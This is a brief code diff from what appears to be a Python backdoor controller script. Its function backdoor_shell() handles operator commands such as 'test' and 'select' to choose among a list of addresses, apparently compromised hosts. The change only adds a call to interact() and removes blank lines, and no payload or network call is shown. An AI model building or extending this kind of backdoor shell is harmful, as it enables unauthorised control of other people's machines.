@@ -146,7 +146,8 @@ def backdoor_shell():
               print "\n"
 
          elif ("test" in user_command):
-            
+
+            print interact()
             one = int(user_command.replace("test ","")) - 1
 			
 	    if ((one < len(all_addresses)) and (one >= 0 )):
@@ -181,9 +182,6 @@ def backdoor_shell():
 
           
               
-               
-
-
          elif("select" in user_command):
 
             chosenone = int(user_command.replace("select ","")) - 1
